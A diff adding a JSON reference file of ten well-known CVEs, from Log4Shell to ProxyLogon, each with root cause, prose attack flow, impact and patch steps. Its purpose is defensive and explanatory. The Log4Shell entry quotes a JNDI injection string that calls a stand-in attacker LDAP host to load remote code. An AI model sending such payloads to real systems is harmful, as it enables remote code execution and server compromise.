@@ -1,0 +1,272 @@
+[
+  {
+    "cve_id": "CVE-2021-44228",
+    "name": "Log4Shell",
+    "severity": "Critical",
+    "cvss_score": "10.0",
+    "vulnerability_type": "Remote Code Execution (RCE)",
+    "description": "Apache Log4j2 JNDI features do not protect against attacker-controlled LDAP and other JNDI related endpoints.",
+    "root_cause": "Improper input validation in Log4j's message lookup mechanism allowing string interpolation of JNDI references.",
+    "attack_flow": [
+      "Attacker sends a specially crafted string containing '${jndi:ldap://attacker.com/a}'",
+      "Log4j processes the string and initiates a JNDI lookup to the attacker's server",
+      "The attacker's server returns a malicious Java class",
+      "Target server downloads and executes the class, leading to full RCE"
+    ],
+    "impact": "Full system compromise, unauthorized data access, and lateral movement.",
+    "risk_level": "Highest",
+    "fix": {
+      "patch": "Update to Log4j 2.17.1 or higher.",
+      "configuration": "Set system property log4j2.formatMsgNoLookups to true.",
+      "code_fix": "Not applicable (Library Update required)",
+      "steps": [
+        "Identify all instances of vulnerable Log4j libraries",
+        "Upgrade to version 2.17.1 (Java 8) or 2.12.4 (Java 7)",
+        "Remove the JndiLookup class from the classpath if patching is delayed"
+      ]
+    }
+  },
+  {
+    "cve_id": "CVE-2017-5638",
+    "name": "Apache Struts RCE",
+    "severity": "Critical",
+    "cvss_score": "10.0",
+    "vulnerability_type": "Remote Code Execution",
+    "description": "The Jakarta Multipart parser in Apache Struts 2 allows remote attackers to execute arbitrary commands via a crafted Content-Type header.",
+    "root_cause": "Improper handling of error messages during multipart file upload allows OGNL expression injection.",
+    "attack_flow": [
+      "Attacker sends an HTTP request with a malicious Content-Type header",
+      "Header contains a crafted OGNL expression",
+      "Struts fails to parse the header and outputs an error message containing the expression",
+      "The OGNL expression is executed by the server during error processing"
+    ],
+    "impact": "Complete control over the web server and data theft.",
+    "risk_level": "Highest",
+    "fix": {
+      "patch": "Upgrade to Struts 2.3.32 or 2.5.10.1.",
+      "configuration": "Switch to a different multipart parser implementation.",
+      "code_fix": "Not applicable",
+      "steps": [
+        "Scan for vulnerable Apache Struts versions",
+        "Upgrade Struts framework to a patched version",
+        "Verify Content-Type validation layers"
+      ]
+    }
+  },
+  {
+    "cve_id": "CVE-2014-0160",
+    "name": "Heartbleed",
+    "severity": "High",
+    "cvss_score": "7.5",
+    "vulnerability_type": "Information Disclosure",
+    "description": "A missing bounds check in the OpenSSL Heartbeat extension allows remote attackers to read server memory.",
+    "root_cause": "The server trusts the user-supplied length of the heartbeat payload without verification.",
+    "attack_flow": [
+      "Attacker sends a TLS Heartbeat request with a small payload but a large length field",
+      "The OpenSSL server allocates a buffer based on the requested length",
+      "The server copies out the heartbeat payload plus adjacent memory to fill the buffer",
+      "Private keys, passwords, and session tokens are leaked in the response"
+    ],
+    "impact": "Leaking of sensitive cryptographic keys and user credentials.",
+    "risk_level": "Critical",
+    "fix": {
+      "patch": "Upgrade to OpenSSL 1.0.1g or higher.",
+      "configuration": "Recompile OpenSSL with -DOPENSSL_NO_HEARTBEATS.",
+      "code_fix": "Not applicable",
+      "steps": [
+        "Patch OpenSSL to version 1.0.1g",
+        "Revoke and reissue SSL certificates",
+        "Force password resets for all users"
+      ]
+    }
+  },
+  {
+    "cve_id": "CVE-2020-1472",
+    "name": "Zerologon",
+    "severity": "Critical",
+    "cvss_score": "10.0",
+    "vulnerability_type": "Privilege Escalation",
+    "description": "An elevation of privilege vulnerability exists when an attacker establishes a vulnerable Netlogon secure channel connection to a domain controller.",
+    "root_cause": "Flaw in the AES-CFB8 cryptographic algorithm implementation where the initialization vector is fixed to zeros.",
+    "attack_flow": [
+      "Attacker sends Netlogon requests with a spoofed computer name",
+      "Attacker sends a stream of zeros in the client challenge",
+      "Due to the cryptographic flaw, the server accepts the challenge 1 in 256 times",
+      "Attacker gains Domain Admin privileges and can change the DC password"
+    ],
+    "impact": "Total takeover of the Windows domain infrastructure.",
+    "risk_level": "Highest",
+    "fix": {
+      "patch": "Apply August 2020 Microsoft security updates.",
+      "configuration": "Enable 'Enforcement mode' for Netlogon.",
+      "code_fix": "Not applicable",
+      "steps": [
+        "Apply the Microsoft security update to all Domain Controllers",
+        "Monitor event logs for vulnerable Netlogon connections",
+        "Transition to Enforcement mode on all DCs"
+      ]
+    }
+  },
+  {
+    "cve_id": "CVE-2019-0708",
+    "name": "BlueKeep",
+    "severity": "Critical",
+    "cvss_score": "9.8",
+    "vulnerability_type": "Remote Code Execution",
+    "description": "A remote code execution vulnerability exists in Remote Desktop Services on Windows 7, Server 2008, and Server 2008 R2.",
+    "root_cause": "Use-after-free vulnerability in the RDP kernel-mode driver when processing virtual channels.",
+    "attack_flow": [
+      "Attacker connects to a target via RDP (Port 3389)",
+      "Attacker sends a specially crafted sequence of RDP packets",
+      "Packets trigger a use-after-free condition in termdd.sys",
+      "Attacker achieves kernel-level code execution without authentication"
+    ],
+    "impact": "Wormable remote code execution, full system takeover.",
+    "risk_level": "Extreme",
+    "fix": {
+      "patch": "Apply Microsoft Windows KB4499175 or higher.",
+      "configuration": "Disable RDP if not needed or enable NLA (Network Level Authentication).",
+      "code_fix": "Not applicable",
+      "steps": [
+        "Install the latest Windows security updates",
+        "Enable Network Level Authentication (NLA) for RDP",
+        "Block port 3389 at the enterprise firewall"
+      ]
+    }
+  },
+  {
+    "cve_id": "CVE-2022-22965",
+    "name": "Spring4Shell",
+    "severity": "Critical",
+    "cvss_score": "9.8",
+    "vulnerability_type": "Remote Code Execution",
+    "description": "A Spring MVC or Spring WebFlux application running on JDK 9+ is vulnerable to remote code execution via data binding.",
+    "root_cause": "Improper access to class properties via the cachedIntrospectionResults allowing manipulation of the ClassLoader.",
+    "attack_flow": [
+      "Attacker sends a POST request with parameters that manipulate the 'class.module.classLoader' property",
+      "Attacker reconfigures the Tomcat Logging properties to write a JSP shell to the web root",
+      "Server creates a malicious .jsp file based on the attacker's input",
+      "Attacker accesses the JSP file to execute arbitrary commands"
+    ],
+    "impact": "Remote code execution on the application server.",
+    "risk_level": "Highest",
+    "fix": {
+      "patch": "Upgrade to Spring Framework 5.3.18 or 5.2.20.",
+      "configuration": "Downgrade to Java 8 or apply a WAF rule to block 'class.*' parameters.",
+      "code_fix": "Not applicable",
+      "steps": [
+        "Verify Spring framework versions in Maven/Gradle",
+        "Upgrade Spring Framework to version 5.3.18+",
+        "Patch Apache Tomcat if applicable"
+      ]
+    }
+  },
+  {
+    "cve_id": "CVE-2018-7600",
+    "name": "Drupalgeddon2",
+    "severity": "Critical",
+    "cvss_score": "9.8",
+    "vulnerability_type": "Remote Code Execution",
+    "description": "A remote code execution vulnerability exists in multiple subsystems of Drupal 7 and 8.",
+    "root_cause": "Improper sanitization of array keys in the Drupal Form API allowing execution of renderable arrays.",
+    "attack_flow": [
+      "Attacker finds an unauthenticated form (e.g., user registration)",
+      "Attacker submits a request with '#' prefixes in parameter names",
+      "The '#' prefix triggers call_user_func in the rendering pipeline",
+      "Attacker executes arbitrary PHP code"
+    ],
+    "impact": "Full website defacement, data theft, and server compromise.",
+    "risk_level": "Critical",
+    "fix": {
+      "patch": "Upgrade to Drupal 7.58 or 8.5.1.",
+      "configuration": "Not applicable",
+      "code_fix": "Not applicable",
+      "steps": [
+        "Immediately upgrade Drupal core to the latest security release",
+        "Check for indicators of compromise (web shells)",
+        "Audit site file permissions"
+      ]
+    }
+  },
+  {
+    "cve_id": "CVE-2021-34527",
+    "name": "PrintNightmare",
+    "severity": "Critical",
+    "cvss_score": "8.8",
+    "vulnerability_type": "Remote Code Execution",
+    "description": "A remote code execution vulnerability exists when the Windows Print Spooler service improperly performs privileged file operations.",
+    "root_cause": "Flaw in the RpcAddPrinterDriverEx function allowing arbitrary driver loading from a remote share.",
+    "attack_flow": [
+      "Attacker authenticates as a low-privileged user",
+      "Attacker calls RpcAddPrinterDriverEx to install a malicious dll as a driver",
+      "The Print Spooler service loads the dll with SYSTEM privileges",
+      "Attacker gains full RCE on the domain controller or server"
+    ],
+    "impact": "Full domain compromise or server takeover.",
+    "risk_level": "Critical",
+    "fix": {
+      "patch": "Apply KB5004945 or higher.",
+      "configuration": "Disable the Print Spooler service on sensitive servers (DCs).",
+      "code_fix": "Not applicable",
+      "steps": [
+        "Apply Microsoft emergency patches",
+        "Disable Print Spooler via GPO where not required",
+        "Restrict printer driver installation to administrators only"
+      ]
+    }
+  },
+  {
+    "cve_id": "CVE-2023-23397",
+    "name": "Outlook NTLM Leak",
+    "severity": "Critical",
+    "cvss_score": "9.8",
+    "vulnerability_type": "Privilege Escalation / Info Leak",
+    "description": "A zero-click vulnerability in Microsoft Outlook allows attackers to steal NTLM hashes.",
+    "root_cause": "Abuse of the PidLidReminderFileParameter property which can point to a UNC path.",
+    "attack_flow": [
+      "Attacker sends a malicious calendar invite or task",
+      "Reminder is triggered automatically by Outlook (Zero-Click)",
+      "Outlook attempts to fetch the reminder sound from the attacker's UNC path",
+      "Target server sends NTLM hashes for authentication to the attacker's path"
+    ],
+    "impact": "Credential theft and account takeover via NTLM relay attacks.",
+    "risk_level": "High",
+    "fix": {
+      "patch": "Apply Microsoft March 2023 updates.",
+      "configuration": "Add users to the 'Protected Users' group in AD.",
+      "code_fix": "Not applicable",
+      "steps": [
+        "Install the latest Outlook security patches",
+        "Block outbound SMB (Port 445) to external IP ranges",
+        "Disable NTLM authentication where possible"
+      ]
+    }
+  },
+  {
+    "cve_id": "CVE-2021-26855",
+    "name": "ProxyLogon",
+    "severity": "Critical",
+    "cvss_score": "9.8",
+    "vulnerability_type": "Remote Code Execution",
+    "description": "Microsoft Exchange Server SSRF vulnerability that allows an unauthenticated attacker to bypass authentication and impersonate an administrator.",
+    "root_cause": "Improper verification of user-controlled cookies in the Exchange Control Panel.",
+    "attack_flow": [
+      "Attacker sends a specially crafted POST request to the Exchange server",
+      "Request includes a 'X-BEResource' cookie pointing to the backend static resource",
+      "Attacker bypasses frontend authentication using SSRF",
+      "Attacker interacts with the ECP to upload a web shell for full RCE"
+    ],
+    "impact": "Full mail theft, server takeover, and lateral network movement.",
+    "risk_level": "Extreme",
+    "fix": {
+      "patch": "Apply March 2021 Cumulative Update for Exchange.",
+      "configuration": "Restrict access to the /owa and /ecp virtual directories.",
+      "code_fix": "Not applicable",
+      "steps": [
+        "Run the Microsoft Exchange health check script",
+        "Apply cumulative security updates immediately",
+        "Hunt for indicators of compromise using the Test-ProxyLogon script"
+      ]
+    }
+  }
+]
